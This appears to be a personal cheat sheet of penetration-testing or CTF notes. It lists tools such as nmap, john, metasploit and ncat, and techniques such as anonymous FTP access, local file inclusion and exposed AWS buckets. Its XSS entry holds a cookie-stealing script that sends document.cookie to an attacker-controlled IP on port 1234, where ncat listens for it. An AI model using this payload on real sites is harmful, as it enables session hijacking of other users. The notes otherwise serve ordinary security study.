# Notes

Tools:
- nmap | $ nmap | Portscan
- john_the_ripper | $ john | PW & Hash Brute-forecing
- dirbuster | $ dirb | dir enumeration
- sherlock | $ python3 sherlock (use whole folder) | OSINT Profile detection by Username
- metasploit | $ msfconsole | Bunch of exploits
- steghide | $ steghide | steganography tool
- ncat | $ncat | use to listen on ports (for example to wait for XSS posts to your ip adress)

Technologies:
- AWS | Amazon Web Services; insecure cloud storage... Use a bucket-name to access on bucketname.amazonaws.com
- FTP | File Transfer Protocol | if configured you can access public files with user "annonymous" pw "guest"
- LFI | Local File Inclusion | Use functions or parameters to access server files; https://www.1337pwn.com/how-to-hack-a-website-using-local-file-inclusion-lfi/ 
- XSS | Cross-Site-Scription | i.e. unsanetiezed User Input (<script> new Image().src = "http://[ip_adress]:1234/cookie.php=cookie="+document.cookie;</cookie> -> then listen to port 1234 to retrieve other users cookie)
